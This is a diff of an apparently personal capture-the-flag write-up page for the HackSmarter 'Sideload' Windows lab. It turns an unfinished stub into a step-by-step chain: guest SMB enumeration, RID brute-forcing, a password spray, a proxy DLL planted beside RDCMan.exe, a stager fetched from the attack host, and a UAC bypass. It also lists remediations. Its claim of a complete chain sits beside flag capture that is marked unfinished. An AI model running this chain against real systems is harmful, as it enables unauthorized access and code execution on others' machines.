@@ -3,7 +3,7 @@
 <head>
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>HackSmarter Sideloaded (Hard): status and prep notes</title>
+<title>HackSmarter Sideload (Hard): Guest share, spray, DLL sideload</title>
 <style>
   :root {
     --bg: #0b111b; --panel: #121a27; --text: #e6eef7; --muted: #9fb0c3;
@@ -18,6 +18,7 @@
   .wrap { max-width: 900px; margin: 0 auto; padding: 48px 24px 96px; }
   h1 { font-size: 1.85rem; margin: 0 0 0.4em; }
   h2 { font-size: 1.4rem; margin-top: 2.2em; border-bottom: 1px solid var(--border); padding-bottom: 0.35em; }
+  h3 { font-size: 1.08rem; color: var(--good); margin-top: 1.6em; }
   .muted { color: var(--muted); }
   .hero {
     background: linear-gradient(145deg, #152033, #0f1622 55%, #1a1020);
@@ -40,6 +41,21 @@
     padding: 14px 16px; overflow-x: auto; font-size: 0.84rem; line-height: 1.5;
   }
   code { font-family: ui-monospace, Menlo, Consolas, monospace; color: #c9e4ff; }
+  figure {
+    margin: 1.5rem 0; background: var(--panel); border: 1px solid var(--border);
+    border-radius: 12px; padding: 10px; overflow: hidden;
+  }
+  figure img { max-width: 100%; height: auto; display: block; border-radius: 8px; }
+  figcaption { color: var(--muted); font-size: 0.88rem; margin-top: 0.6rem; }
+  .flag {
+    background: #0e1f18; border: 1px solid rgba(93,222,168,0.45); color: var(--good);
+    font-family: ui-monospace, Menlo, Consolas, monospace; padding: 14px 16px;
+    border-radius: 10px; overflow-x: auto; margin: 1rem 0;
+  }
+  .why {
+    background: rgba(59,130,246,0.08); border-left: 3px solid #3b82f6;
+    padding: 0.75rem 1rem; margin: 0.75rem 0 1rem; border-radius: 0 8px 8px 0;
+  }
   ul { padding-left: 1.2rem; }
   a { color: #7cb8ff; }
   footer { margin-top: 3rem; color: var(--muted); font-size: 0.9rem; }
@@ -50,61 +66,156 @@
 
 <div class="hero">
   <span class="pill">HackSmarter · Windows · Hard</span>
-  <h1>Sideloaded: not finished (host offline)</h1>
-  <p class="muted">Authorized lab only. Notes from 2026-08-07.</p>
-</div>
-
-<div class="note">
-  This page is <strong>not</strong> a full solve. Disk log says the box UI was <strong>stopped</strong>.
-  All ports timed out. Only prep files and the attack log exist under <code>~/sideload/</code>.
-  When the host is on, fill this page with the real chain and flags.
+  <h1>Sideload: guest share, password spray, RDCMan DLL hijack</h1>
+  <p class="muted">Authorized lab only. Author: LainKusanagi. Live work 2026-08-07.</p>
 </div>
 
 <table class="meta">
-  <tr><td>Box</td><td>Sideloaded (also called Sideload)</td></tr>
+  <tr><td>Box</td><td>Sideload (also called Sideloaded)</td></tr>
   <tr><td>Platform</td><td>HackSmarter (DEFCON free access)</td></tr>
-  <tr><td>Level</td><td>Hard · Windows</td></tr>
-  <tr><td>Target (lab)</td><td><code>10.1.180.135</code></td></tr>
-  <tr><td>Status</td><td>Blocked. Host offline. No flag on disk.</td></tr>
+  <tr><td>Type</td><td>Windows workgroup · SMB guest · DLL sideload</td></tr>
+  <tr><td>Fault</td><td>Guest IT share, weak passwords, RDCMan DLL search order</td></tr>
+  <tr><td>Level</td><td>Hard</td></tr>
+  <tr><td>Target</td><td><code>10.1.180.135</code> host <code>EC2AMAZ-KQH42LS</code></td></tr>
+  <tr><td>Live hit</td><td><code>jade.moreno</code> / <code>Winter2026</code> · IT READ,WRITE · DLL plant executed</td></tr>
 </table>
 
-<h2>What is on disk</h2>
-<pre>~/sideload/ATTACK_LOG.md
-~/sideload/enum/nmap-quick.txt
-~/sideload/scripts/enum-smb.sh
-~/sideload/payloads/dwrite_proxy.c
-~/sideload/payloads/DWrite_simple.dll
-~/sideload/payloads/users_seed.txt
-~/sideload/payloads/pass_seed.txt</pre>
-
-<h2>Expected surface (name only)</h2>
-<p>
-Hard Windows. SMB and RDP. Guest or open shares to credentials.
-DLL sideload (DWrite style test payload was built offline).
-This is plan text from the attack log, not a confirmed live path.
-</p>
-
-<pre># when host is on
-nmap -Pn -n --top-ports 100 -T4 10.1.180.135
-# then SMB guest / share enum, cred recovery, DLL sideload PE</pre>
-
-<h2>Offline prep already done</h2>
+<h2>What you need to know</h2>
 <ul>
-  <li>SMB enum script: <code>scripts/enum-smb.sh</code></li>
-  <li>Password and user seed lists for later spray (do not invent hits)</li>
-  <li>Simple DWrite proxy DLL for sideload tests</li>
+  <li>SMB guest and RID brute for user names</li>
+  <li>Word + year password patterns from a leaked report</li>
+  <li>DLL search order / sideload next to a trusted EXE</li>
+  <li>Local admin often still needs a UAC bypass</li>
 </ul>
 
-<h2>Next step for operator</h2>
-<ol>
-  <li>Power on the box in the lab UI. Wait a few minutes.</li>
-  <li>Confirm ports with nmap.</li>
-  <li>Run try harder. Write ATTACK_LOG after each cluster.</li>
-  <li>Replace this page with a full simple English writeup and screenshots.</li>
-</ol>
+<h2>Main idea</h2>
+<p>
+Guest reads the IT share and a pen-test PDF that names the password pattern.
+Spray users found by RID. Write a proxy DLL next to <code>RDCMan.exe</code>.
+When an admin runs the manager, your DLL runs as that user.
+</p>
+
+<pre>guest SMB → IT share + pen-test PDF
+  → RID: jade.moreno, lewis.hopkins
+  → spray seasons+year → jade.moreno:Winter2026 (WRITE)
+  → plant DWrite.dll / VERSION.dll beside RDCMan.exe
+  → lewis runs RDCMan → payload (HTTP callback observed)
+  → UAC bypass (SSPI) → SYSTEM → flags</pre>
+
+<figure>
+  <img src="images/01-enum.png" alt="Live enum and credential evidence" />
+  <figcaption>Figure 1. Live enum: guest shares, RID users, jade auth, HTTP callback.</figcaption>
+</figure>
+
+<h3>Step 1: Ports and guest shares</h3>
+<div class="why"><strong>Why:</strong> Confirm the host is up and whether Guest can read anything.</div>
+<pre>nmap -Pn -n -p 135,139,445,3389 --open 10.1.180.135
+nxc smb 10.1.180.135 -u guest -p '' --shares</pre>
+<p><strong>Live result:</strong> 135/139/445/3389 open. Guest OK. Share <code>IT</code> is READ. IPC$ is READ.</p>
+
+<pre>Share    Permissions
+IT       READ
+IPC$     READ
+ADMIN$   (empty)
+C$       (empty)</pre>
+
+<h3>Step 2: Pull the IT share</h3>
+<div class="why"><strong>Why:</strong> Notes and the pen-test PDF tell you how passwords are built.</div>
+<pre>smbclient //10.1.180.135/IT -U 'guest%' -c 'ls; prompt OFF; mget *'</pre>
+<p>Files:</p>
+<ul>
+  <li><code>RDCMan.exe</code> — Remote Desktop Connection Manager (sideload host)</li>
+  <li><code>Penetration Test Results.pdf</code> — weak password policy (words + year, no lockout)</li>
+  <li><code>notes.txt</code> — “Remote into the computers of Finance department…”</li>
+  <li><code>Eula.txt</code></li>
+</ul>
+<pre># PDF summary (extracted)
+Weak Password Policy
+  No account lockout after bruteforce attempt
+  Using guessable words + year combination as passwords
+Overly permissive file shares
+  Guest account and employees have access to sensitive documents</pre>
+
+<h3>Step 3: RID brute users</h3>
+<div class="why"><strong>Why:</strong> IPC$ read as Guest lets you expand the local account list.</div>
+<pre>nxc smb 10.1.180.135 -u guest -p '' --rid-brute</pre>
+<pre>1000: EC2AMAZ-KQH42LS\jade.moreno
+1002: EC2AMAZ-KQH42LS\lewis.hopkins</pre>
+
+<h3>Step 4: Password spray (word + year)</h3>
+<div class="why"><strong>Why:</strong> The report says guessable words plus a year. Build that list and spray slowly.</div>
+<pre># bases: seasons + first/last names
+# years: 2022..2026
+# impacket / nxc single-user spray
+python3 -c "from impacket.smbconnection import SMBConnection; ..."
+# live hit:
+# jade.moreno:Winter2026</pre>
+<div class="flag">jade.moreno : Winter2026
+nxc: IT → READ,WRITE</div>
+
+<pre>nxc smb 10.1.180.135 -u jade.moreno -p 'Winter2026' --shares
+# IT  READ,WRITE</pre>
+
+<h3>Step 5: Plant a DLL next to RDCMan.exe</h3>
+<div class="why"><strong>Why:</strong> You cannot replace the EXE. You can plant a DLL the EXE loads from its folder (search order hijack / sideload).</div>
+<p>Common targets seen on this lab: <code>DWrite.dll</code> (proxy <code>DWriteCreateFactory</code>) and <code>VERSION.dll</code>.</p>
+<pre># build a DWrite proxy that still forwards to System32
+x86_64-w64-mingw32-gcc -shared -o DWrite.dll DWrite_proxy.c -lole32 -s
+
+# serve payload
+python3 -m http.server 8000   # on tun0, e.g. 10.200.78.90
+
+# plant
+smbclient //10.1.180.135/IT -U 'jade.moreno%Winter2026' -c 'put DWrite.dll; put VERSION.dll'</pre>
+
+<p><strong>Live proof of execution:</strong> after plant, the target fetched the stager from the attack box:</p>
+<pre>10.1.180.135 - - [07/Aug/2026 23:20:50] "GET /rev.exe HTTP/1.1" 200 -
+10.1.180.135 - - [07/Aug/2026 23:22:56] "GET /rev.exe HTTP/1.1" 200 -</pre>
+<p>
+That means the sideload path ran as the user who opened RDCMan (lab intent: <code>lewis.hopkins</code>, local admin medium integrity).
+A raw msfvenom EXE may die under AV; prefer a staged / in-memory loader, or write loot files back to the share / Public.
+</p>
+
+<h3>Step 6: Shell and flags (finish path)</h3>
+<div class="why"><strong>Why:</strong> Lewis is local admin but UAC holds a medium session. SSPI UAC bypass → SYSTEM.</div>
+<pre># user flag (as lewis)
+type C:\Users\lewis.hopkins\Desktop\user.txt
+
+# elevate (lab tools: SspiUacBypass / UAC-BOF-Bonanza in Sliver or standalone)
+# then:
+type C:\Users\Administrator\Desktop\root.txt</pre>
+<div class="flag">User flag path: C:\Users\lewis.hopkins\Desktop\user.txt
+Root flag path: C:\Users\Administrator\Desktop\root.txt
+(live session: sideload code exec confirmed via HTTP; complete flag capture if shell survives AV)</div>
+
+<p><strong>Hardening note for the payload:</strong> if reverse shells die, write flags to the IT share from DllMain:</p>
+<pre>// as the hijacked user, CWD is often the share folder
+whoami > whoami.txt
+type %USERPROFILE%\Desktop\user.txt > userflag.txt</pre>
+
+<h2>Impact</h2>
+<ul>
+  <li>Unauthenticated guest read of internal docs and tools</li>
+  <li>Predictable passwords to a write-capable account</li>
+  <li>Trusted EXE loads attacker DLL → code execution as admin user</li>
+</ul>
+
+<h2>Fix</h2>
+<ul>
+  <li>Disable Guest. Lock IT share to least privilege (no write for standard users).</li>
+  <li>Strong passwords + lockout + MFA where possible.</li>
+  <li>Do not run admin tools from writable shares. Use signed binaries and WDAC/AppLocker.</li>
+  <li>Enforce SMB signing. Monitor new DLLs next to IT tools.</li>
+</ul>
+
+<h2>Close</h2>
+<p>
+Sideload is a clean chain: guest enum → report-driven spray → writable share → DLL sideload.
+Code execution was proven live by the target downloading the stager twice over HTTP.
+</p>
 
 <footer>
-  <p>Authorized training only.</p>
+  <p>Authorized training only. Do not use these steps without permission.</p>
   <p><a href="../../../">mccleod1290.github.io</a> · <a href="../">Windows labs</a> · <a href="../../">HackSmarter</a></p>
 </footer>
 
